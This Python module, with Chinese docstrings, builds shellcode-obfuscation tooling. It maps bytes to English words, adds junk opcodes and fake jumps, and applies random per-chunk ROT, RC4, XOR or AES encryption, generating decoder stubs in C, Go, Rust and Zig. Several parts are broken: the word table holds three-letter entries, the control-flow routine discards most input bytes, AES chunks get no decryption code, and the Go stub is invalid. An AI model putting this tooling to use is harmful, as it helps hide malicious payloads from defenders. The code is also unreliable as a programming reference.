import random


ENGLISH_WORDS_4 = [
    "able",
    "back",
    "call",
    "data",
    "each",
    "face",
    "game",
    "hard",
    "idea",
    "just",
    "know",
    "last",
    "make",
    "name",
    "over",
    "part",
    "quit",
    "race",
    "safe",
    "take",
    "used",
    "very",
    "want",
    "year",
    "zone",
    "also",
    "best",
    "come",
    "down",
    "even",
    "find",
    "give",
    "here",
    "join",
    "keep",
    "left",
    "most",
    "next",
    "only",
    "plan",
    "read",
    "some",
    "time",
    "upon",
    "walk",
    "your",
    "both",
    "city",
    "does",
    "ever",
    "five",
    "goes",
    "held",
    "item",
    "kind",
    "look",
    "made",
    "none",
    "open",
    "play",
    "real",
    "said",
    "told",
    "uses",
    "well",
    "zero",
    "area",
    "been",
    "case",
    "done",
    "felt",
    "gets",
    "high",
    "jobs",
    "knew",
    "late",
    "move",
    "news",
    "once",
    "paid",
    "rest",
    "seen",
    "took",
    "view",
    "went",
    "adds",
    "body",
    "came",
    "door",
    "eyes",
    "form",
    "gone",
    "home",
    "kept",
    "life",
    "main",
    "need",
    "ones",
    "past",
    "runs",
    "sets",
    "sure",
    "turn",
    "ways",
    "week",
    "ages",
    "book",
    "care",
    "days",
    "ends",
    "four",
    "good",
    "hope",
    "keys",
    "line",
    "many",
    "note",
    "ours",
    "pull",
    "rate",
    "show",
    "talk",
    "type",
    "west",
    "word",
    "ask",
    "base",
    "cars",
    "dear",
    "easy",
    "free",
    "grew",
    "hour",
    "king",
    "list",
    "mark",
    "near",
    "off",
    "pick",
    "rare",
    "side",
    "task",
    "unit",
    "wait",
    "work",
    "away",
    "bear",
    "cent",
    "deep",
    "fall",
    "full",
    "gave",
    "huge",
    "land",
    "lost",
    "meet",
    "neat",
    "page",
    "push",
    "rich",
    "site",
    "team",
    "user",
    "wall",
    "yard",
    "bank",
    "beat",
    "cost",
    "diet",
    "fast",
    "gain",
    "gold",
    "iron",
    "lake",
    "love",
    "mind",
    "nice",
    "pass",
    "pure",
    "ride",
    "size",
    "term",
    "vary",
    "warm",
    "yeah",
    "bath",
    "bend",
    "cold",
    "draw",
    "farm",
    "girl",
    "gray",
    "jack",
    "lane",
    "luck",
    "mine",
    "nine",
    "path",
    "rain",
    "road",
    "skin",
    "test",
    "vast",
    "wave",
    "zoom",
    "bird",
    "blue",
    "cook",
    "drop",
    "feed",
    "glad",
    "glow",
    "jane",
    "laws",
    "mail",
    "miss",
    "node",
    "peak",
    "rank",
    "ring",
    "slow",
    "text",
    "vice",
    "weak",
    "blow",
    "boat",
    "cool",
    "drug",
    "feel",
    "goal",
    "grow",
    "jean",
    "lead",
    "male",
    "moon",
    "noon",
    "pink",
    "salt",
    "snow",
    "thus",
    "vote",
    "wear",
    "born",
    "bone",
    "copy",
    "dual",
    "fill",
    "goat",
    "hair",
    "joke",
    "leaf",
    "mass",
    "nose",
    "pole",
    "rock",
    "soft",
]


def bytes_to_english_words(data):
    """
    将字节数据转换为英语单词序列

    Args:
        data: 字节数据

    Returns:
        英语单词列表
    """
    return [ENGLISH_WORDS_4[byte] for byte in data]


def english_words_to_bytes(words):
    """
    将英语单词序列转换回字节数据

    Args:
        words: 英语单词列表

    Returns:
        字节数据
    """
    word_to_byte = {word: i for i, word in enumerate(ENGLISH_WORDS_4)}
    return bytes([word_to_byte[word] for word in words])


def generate_english_word_shellcode(data, language="c"):
    """
    生成使用英语单词混淆的shellcode代码

    Args:
        data: 原始shellcode字节数据
        language: 目标语言

    Returns:
        混淆后的代码字符串
    """
    words = bytes_to_english_words(data)

    if language == "c":
        return generate_c_english_word_code(words)
    elif language == "go":
        return generate_go_english_word_code(words)
    elif language == "rust":
        return generate_rust_english_word_code(words)
    elif language == "zig":
        return generate_zig_english_word_code(words)
    else:
        return ""


def generate_c_english_word_code(words):
    """生成C语言的英语单词混淆代码"""
    word_list = ", ".join(f'"{w}"' for w in words)
    code = f"""// English word obfuscated shellcode
const char* shellcode_words[] = {{{word_list}}};
const int shellcode_len = {len(words)};

// 256个4字母单词映射表
const char* word_map[256] = {{
    {", ".join(f'"{w}"' for w in ENGLISH_WORDS_4)}
}};

void decode_shellcode(unsigned char* output) {{
    // 构建单词到字节的映射
    unsigned char word_to_byte[256];
    for (int i = 0; i < 256; i++) {{
        for (int j = 0; j < 256; j++) {{
            // 简单比较前4个字符
            if (word_map[j][0] == shellcode_words[i][0] &&
                word_map[j][1] == shellcode_words[i][1] &&
                word_map[j][2] == shellcode_words[i][2] &&
                word_map[j][3] == shellcode_words[i][3]) {{
                output[i] = (unsigned char)j;
                break;
            }}
        }}
    }}
}}
"""
    return code


def generate_go_english_word_code(words):
    """生成Go语言的英语单词混淆代码"""
    word_list = ", ".join(f'"{w}"' for w in words)
    code = f"""// English word obfuscated shellcode
var shellcodeWords = []string{{{word_list}}}
var shellcodeLen = {len(words)}

// 256个4字母单词映射表
var wordMap = [256]string{{
    {", ".join(f'"{w}"' for w in ENGLISH_WORDS_4)}
}}

func decodeShellcode() []byte {{
    output := make([]byte, len(shellcodeWords))
    for i, word := range shellcodeWords {{
        for j, mw := range wordMap {{
            if word == mw {{
                output[i] = byte(j)
                break
            }}
        }}
    }}
    return output
}}
"""
    return code


def generate_rust_english_word_code(words):
    """生成Rust语言的英语单词混淆代码"""
    word_list = ", ".join(f'"{w}"' for w in words)
    code = f"""// English word obfuscated shellcode
const SHELLCODE_WORDS: [&str; {len(words)}] = [{word_list}];

// 256个4字母单词映射表
const WORD_MAP: [&str; 256] = [
    {", ".join(f'"{w}"' for w in ENGLISH_WORDS_4)}
];

fn decode_shellcode() -> Vec<u8> {{
    let mut output = Vec::with_capacity(SHELLCODE_WORDS.len());
    for word in SHELLCODE_WORDS.iter() {{
        for (j, &mw) in WORD_MAP.iter().enumerate() {{
            if *word == mw {{
                output.push(j as u8);
                break;
            }}
        }}
    }}
    output
}}
"""
    return code


def generate_zig_english_word_code(words):
    """生成Zig语言的英语单词混淆代码"""
    word_list = ", ".join(f'"{w}"' for w in words)
    code = f"""// English word obfuscated shellcode
const shellcode_words = [_][]const u8{{{word_list}}};

// 256个4字母单词映射表
const word_map = [_][]const u8{{
    {", ".join(f'"{w}"' for w in ENGLISH_WORDS_4)}
}};

fn decodeShellcode() []u8 {{
    var output: [{len(words)}]u8 = undefined;
    for (shellcode_words) |word, i| {{
        for (word_map) |mw, j| {{
            if (std.mem.eql(u8, word, mw)) {{
                output[i] = @intCast(u8, j);
                break;
            }}
        }}
    }}
    return &output;
}}
"""
    return code


def add_junk_instructions(data, count=0, instruction_type=None):
    """
    添加垃圾指令

    Args:
        data: 原始数据
        count: 添加的垃圾指令数量
        instruction_type: 指令类型 (nop, jmp, call, etc.)

    Returns:
        包含垃圾指令的数据
    """
    if count == 0:
        return data

    if instruction_type is None:
        instruction_type = random.choice(["nop", "jmp", "call"])

    result = bytearray()

    if instruction_type == "nop":
        for _ in range(count):
            result.append(0x90)
    elif instruction_type == "jmp":
        for _ in range(count):
            result.append(0xEB)
    elif instruction_type == "call":
        for _ in range(count):
            result.append(0xE8)

    return bytes(result) + data


def add_control_flow_obfuscation(data, jump_probability=0.3):
    """
    添加控制流混淆

    Args:
        data: 原始数据
        jump_probability: 跳转概率 (0.0-1.0)

    Returns:
        包含控制流混淆的数据
    """
    if jump_probability == 0:
        return data

    result = bytearray()
    data_len = len(data)

    for i in range(0, data_len, 4):
        if random.random() < jump_probability:
            jmp_offset = random.randint(-128, 127)
            if 0 <= jmp_offset < 0:
                jmp_offset = 1

            if random.random() < 0.5:
                jmp_target = random.randint(0, data_len - 1)
                if jmp_target < 0:
                    jmp_target = i + 1

                result.append(0xEB)
                result.append(jmp_offset & 0xFF)
                result.append((jmp_offset >> 8) & 0xFF)
                result.append(0x00)
                result.append(jmp_target & 0xFF)
                result.append((jmp_target >> 8) & 0xFF)
                result.append(0xE0)

        result.append(data[i])

    return bytes(result)


def add_polymorphic_encryption(data, key, language="c"):
    """
    添加多态加密

    Args:
        data: 原始数据
        key: 加密密钥
        language: 目标语言

    Returns:
        多态加密后的数据, 加密日志, 解密代码
    """
    result = bytearray()
    encryption_log = []

    encryption_methods = [
        ("rot", lambda d, k: rot_encrypt(d, int(k) % 13)),
        ("rc4", lambda d, k: rc4_encrypt(d, k)),
        ("xor", lambda d, k: xor_encrypt(d, k)),
        ("aes", lambda d, k: aes_encrypt(d, k)),
    ]

    for i in range(0, len(data), 16):
        chunk = data[i : i + 16]
        if len(chunk) < 16:
            chunk = chunk + b"\x00" * (16 - len(chunk))

        method_name, encrypt_func = random.choice(encryption_methods)
        encrypted_chunk = encrypt_func(chunk, key)
        result.extend(encrypted_chunk)
        encryption_log.append((i, method_name, len(encrypted_chunk)))

    decryption_code = generate_decryption_code(encryption_log, key, language)

    return bytes(result), encryption_log, decryption_code


def generate_decryption_code(encryption_log, key, language):
    """
    生成解密代码

    Args:
        encryption_log: 加密日志
        key: 加密密钥
        language: 目标语言

    Returns:
        解密代码
    """
    if language == "c":
        return generate_c_decryption_code(encryption_log, key)
    elif language == "go":
        return generate_go_decryption_code(encryption_log, key)
    elif language == "rust":
        return generate_rust_decryption_code(encryption_log, key)
    elif language == "zig":
        return generate_zig_decryption_code(encryption_log, key)
    else:
        return ""


def generate_c_decryption_code(encryption_log, key):
    """生成C语言解密代码"""
    code = "// Decryption code\n"
    code += "void decrypt_shellcode(unsigned char* data, int len) {\n"

    for offset, method, chunk_len in encryption_log:
        code += f"    // Chunk at offset {offset}: {method}\n"
        if method == "rot":
            rot_key = int(key) % 13
            code += f"    for (int i = {offset}; i < {offset + chunk_len}; i++) {{\n"
            code += f"        data[i] = (data[i] - {rot_key}) & 0xFF;\n"
            code += f"    }}\n"
        elif method == "xor":
            code += f'    const char* xor_key = "{key}";\n'
            code += f"    int key_len = {len(key)};\n"
            code += f"    for (int i = {offset}; i < {offset + chunk_len}; i++) {{\n"
            code += f"        data[i] ^= xor_key[i % key_len];\n"
            code += f"    }}\n"
        elif method == "rc4":
            code += f"    // RC4 decryption (same as encryption)\n"
            code += f"    unsigned char s[256];\n"
            code += f"    int j = 0;\n"
            code += f'    const char* rc4_key = "{key}";\n'
            code += f"    int key_len = {len(key)};\n"
            code += f"    for (int i = 0; i < 256; i++) s[i] = i;\n"
            code += f"    for (int i = 0; i < 256; i++) {{\n"
            code += f"        j = (j + s[i] + rc4_key[i % key_len]) % 256;\n"
            code += f"        unsigned char tmp = s[i]; s[i] = s[j]; s[j] = tmp;\n"
            code += f"    }}\n"
            code += f"    int ii = 0, jj = 0;\n"
            code += f"    for (int i = {offset}; i < {offset + chunk_len}; i++) {{\n"
            code += f"        ii = (ii + 1) % 256;\n"
            code += f"        jj = (jj + s[ii]) % 256;\n"
            code += f"        unsigned char tmp = s[ii]; s[ii] = s[jj]; s[jj] = tmp;\n"
            code += f"        data[i] ^= s[(s[ii] + s[jj]) % 256];\n"
            code += f"    }}\n"
        elif method == "aes":
            code += f"    // AES decryption required\n"

    code += "}\n"
    return code


def generate_go_decryption_code(encryption_log, key):
    """生成Go语言解密代码"""
    code = "// Decryption code\n"
    code += "func decryptShellcode(data []byte) []byte {\n"

    for offset, method, chunk_len in encryption_log:
        code += f"    // Chunk at offset {offset}: {method}\n"
        if method == "rot":
            rot_key = int(key) % 13
            code += f"    for i := {offset}; i < {offset + chunk_len}; i++ {{\n"
            code += f"        data[i] = (data[i] - {rot_key}) & 0xFF\n"
            code += f"    }}\n"
        elif method == "xor":
            code += f'    xorKey := []byte{{"{key}"}}\n'
            code += f"    keyLen := {len(key)}\n"
            code += f"    for i := {offset}; i < {offset + chunk_len}; i++ {{\n"
            code += f"        data[i] ^= xorKey[i % keyLen]\n"
            code += f"    }}\n"
        elif method == "rc4":
            code += f"    // RC4 decryption (same as encryption)\n"
            code += f'    rc4Key := []byte{{"{key}"}}\n'
            code += f"    s := make([]byte, 256)\n"
            code += f"    for i := 0; i < 256; i++ {{ s[i] = byte(i) }}\n"
            code += f"    j := 0\n"
            code += f"    for i := 0; i < 256; i++ {{\n"
            code += (
                f"        j = (j + int(s[i]) + int(rc4Key[i % len(rc4Key)])) % 256\n"
            )
            code += f"        s[i], s[j] = s[j], s[i]\n"
            code += f"    }}\n"
            code += f"    ii, jj := 0, 0\n"
            code += f"    for i := {offset}; i < {offset + chunk_len}; i++ {{\n"
            code += f"        ii = (ii + 1) % 256\n"
            code += f"        jj = (jj + int(s[ii])) % 256\n"
            code += f"        s[ii], s[jj] = s[jj], s[ii]\n"
            code += f"        data[i] ^= s[(s[ii] + s[jj]) % 256]\n"
            code += f"    }}\n"
        elif method == "aes":
            code += f"    // AES decryption required\n"

    code += "    return data\n"
    code += "}\n"
    return code


def generate_rust_decryption_code(encryption_log, key):
    """生成Rust语言解密代码"""
    code = "// Decryption code\n"
    code += "fn decrypt_shellcode(data: &mut [u8]) {\n"

    for offset, method, chunk_len in encryption_log:
        code += f"    // Chunk at offset {offset}: {method}\n"
        if method == "rot":
            rot_key = int(key) % 13
            code += f"    for i in {offset}..{offset + chunk_len} {{\n"
            code += f"        data[i] = data[i].wrapping_sub({rot_key});\n"
            code += f"    }}\n"
        elif method == "xor":
            code += f'    let xor_key = b"{key}";\n'
            code += f"    let key_len = {len(key)};\n"
            code += f"    for i in {offset}..{offset + chunk_len} {{\n"
            code += f"        data[i] ^= xor_key[i % key_len];\n"
            code += f"    }}\n"
        elif method == "rc4":
            code += f"    // RC4 decryption (same as encryption)\n"
            code += f'    let rc4_key = b"{key}";\n'
            code += f"    let mut s: [u8; 256] = [0; 256];\n"
            code += f"    for i in 0..256 {{ s[i] = i as u8; }}\n"
            code += f"    let mut j: usize = 0;\n"
            code += f"    for i in 0..256 {{\n"
            code += f"        j = (j + s[i] as usize + rc4_key[i % rc4_key.len()] as usize) % 256;\n"
            code += f"        s.swap(i, j);\n"
            code += f"    }}\n"
            code += f"    let mut ii: usize = 0;\n"
            code += f"    let mut jj: usize = 0;\n"
            code += f"    for i in {offset}..{offset + chunk_len} {{\n"
            code += f"        ii = (ii + 1) % 256;\n"
            code += f"        jj = (jj + s[ii] as usize) % 256;\n"
            code += f"        s.swap(ii, jj);\n"
            code += f"        data[i] ^= s[(s[ii] as usize + s[jj] as usize) % 256];\n"
            code += f"    }}\n"
        elif method == "aes":
            code += f"    // AES decryption required\n"

    code += "}\n"
    return code


def generate_zig_decryption_code(encryption_log, key):
    """生成Zig语言解密代码"""
    code = "// Decryption code\n"
    code += "fn decryptShellcode(data: []u8) void {\n"

    for offset, method, chunk_len in encryption_log:
        code += f"    // Chunk at offset {offset}: {method}\n"
        if method == "rot":
            rot_key = int(key) % 13
            code += f"    for (var i: usize = {offset}; i < {offset + chunk_len}; i += 1) {{\n"
            code += f"        data[i] = (data[i] - {rot_key}) & 0xFF;\n"
            code += f"    }}\n"
        elif method == "xor":
            code += f'    const xor_key = "{key}";\n'
            code += f"    const key_len: usize = {len(key)};\n"
            code += f"    for (var i: usize = {offset}; i < {offset + chunk_len}; i += 1) {{\n"
            code += f"        data[i] ^= xor_key[i % key_len];\n"
            code += f"    }}\n"
        elif method == "rc4":
            code += f"    // RC4 decryption (same as encryption)\n"
            code += f'    const rc4_key = "{key}";\n'
            code += f"    var s: [256]u8 = undefined;\n"
            code += f"    for (var i: usize = 0; i < 256; i += 1) {{ s[i] = i; }}\n"
            code += f"    var j: usize = 0;\n"
            code += f"    for (var i: usize = 0; i < 256; i += 1) {{\n"
            code += f"        j = (j + s[i] + rc4_key[i % rc4_key.len]) % 256;\n"
            code += f"        const tmp = s[i]; s[i] = s[j]; s[j] = tmp;\n"
            code += f"    }}\n"
            code += f"    var ii: usize = 0;\n"
            code += f"    var jj: usize = 0;\n"
            code += f"    for (var i: usize = {offset}; i < {offset + chunk_len}; i += 1) {{\n"
            code += f"        ii = (ii + 1) % 256;\n"
            code += f"        jj = (jj + s[ii]) % 256;\n"
            code += f"        const tmp = s[ii]; s[ii] = s[jj]; s[jj] = tmp;\n"
            code += f"        data[i] ^= s[(s[ii] + s[jj]) % 256];\n"
            code += f"    }}\n"
        elif method == "aes":
            code += f"    // AES decryption required\n"

    code += "}\n"
    return code


def rot_encrypt(data, key):
    """
    ROT加密

    Args:
        data: 要加密的数据
        key: 密钥

    Returns:
        加密后的数据
    """
    result = bytearray()
    for byte in data:
        result.append((byte + key) % 256)
    return bytes(result)


def rc4_encrypt(data, key):
    """
    RC4加密

    Args:
        data: 要加密的数据
        key: 密钥

    Returns:
        加密后的数据
    """
    s = list(range(256))
    j = 0
    key_bytes = key if isinstance(key, bytes) else key.encode()
    key_len = len(key_bytes)
    for i in range(256):
        j = (j + s[i] + key_bytes[i % key_len]) % 256
        s[i], s[j] = s[j], s[i]
    result = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        result.append(byte ^ s[(s[i] + s[j]) % 256])
    return bytes(result)


def xor_encrypt(data, key):
    """
    XOR加密

    Args:
        data: 要加密的数据
        key: 密钥

    Returns:
        加密后的数据
    """
    key_bytes = key if isinstance(key, bytes) else key.encode()
    key_len = len(key_bytes)
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key_bytes[i % key_len])
    return bytes(result)


def aes_encrypt(data, key):
    """
    AES加密

    Args:
        data: 要加密的数据
        key: 密钥

    Returns:
        加密后的数据
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad

    key_bytes = key if isinstance(key, bytes) else key.encode()
    if len(key_bytes) not in [16, 24, 32]:
        key_bytes = key_bytes[:32].ljust(32, b"\x00")
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    padded_data = pad(data, AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    return encrypted
